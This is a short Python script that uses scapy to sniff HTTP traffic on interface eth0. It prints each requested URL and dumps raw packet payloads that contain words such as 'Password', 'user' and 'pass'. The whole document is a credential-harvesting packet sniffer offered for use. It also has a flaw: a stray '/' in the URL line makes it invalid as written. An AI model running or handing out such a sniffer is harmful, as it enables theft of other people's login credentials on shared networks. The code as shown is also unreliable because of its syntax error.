#!/usr/bin/python

# does not work with https

import scapy.all as scapy
from scapy_http import http

def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host /
        + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for i in words:
                if i in str(load):
                    print(load)

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)

words = ['Password','user','username','pass','User','Password']
sniff("eth0")